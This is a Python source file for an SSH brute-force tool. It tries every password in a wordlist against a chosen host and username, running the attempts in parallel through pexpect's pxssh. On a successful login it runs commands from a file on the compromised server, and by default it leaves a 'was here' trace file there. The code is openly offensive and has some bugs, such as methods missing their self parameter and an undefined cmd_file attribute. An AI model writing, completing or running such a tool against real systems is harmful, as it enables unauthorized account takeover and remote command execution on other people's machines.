#/usr/bin/env py3

import os
from pexpect import pxssh
import multiprocessing as mltp
from time import sleep

from output_functions import output


class bruteforce_ssh():
    def __init__(self, hostname, user, passwd_file):
        self.printer = output()
        self.host = hostname
        self.user = user
        self.passwd_file = passwd_file
        self.my_queue = self.init_multi_processing_queue()
        self.passwd_list = self.get_passwd_list()

    def init_multi_processing_queue(self):
        my_queue = mltp.Queue()
        my_queue.put((0, False))
        my_queue.put((1, None))
        return my_queue

    def get_passwd_list(self):
        passwd_list = []
        f = open(self.passwd_file, 'r')
        for passwd in f.readlines():
            passwd_list.append(passwd.replace('\n', ''))

        if len(passwd_list) == 0:
            self.printer.no_passwd_to_try(self.passwd_file)
            exit()

        return passwd_list

    def start_bruteforcing(self):
        infos = [self.host, self.user]

        for passwd in self.passwd_list:
            # Remove previous password and current one to infos
            ## why not dictionnary ?
            # mltp.Process only take tuple as argument
            if (len(infos) > 2):
                infos.pop()
            infos.append(passwd)

            event_result = self.my_queue.get()[1]
            if (event_result == True):
                exit(0)
            else:
                self.my_queue.put((0, event_result))

            processes = [mltp.Process(target=self.try_to_connect_to_host,
                                       args=(infos,))]
            processes[0].start()
            sleep(0.8)

        for endProcess in processes:
            endProcess.join(2)


    def try_to_connect_to_host(self, infos):
        try:
            serv = pxssh.pxssh()
            serv.login(infos[0], infos[1], infos[2])
            self.my_queue.put((0, True))
            self.printer.success(infos[2], infos[1])
            self.send_cmd_to_server(serv)
        except:
            self.printer.connection_failed(infos[1], infos[2])

    def send_cmd_to_server(serv):
        if (self.cmd_file == None):
            # Sure you want to do that?
            self.execute_cmd_on_server(serv, 'echo "' + os.getlogin() +
                    ' was here" >> .trace')
        else:
            f = open(self.cmd_file)
            for l in f.readlines():
                self.execute_cmd_on_server(serv, l.replace('\n', ''))


    def execute_cmd_on_server(serv, cmd):
        serv.sendline(cmd)
        serv.prompt()
        print(serv.before)
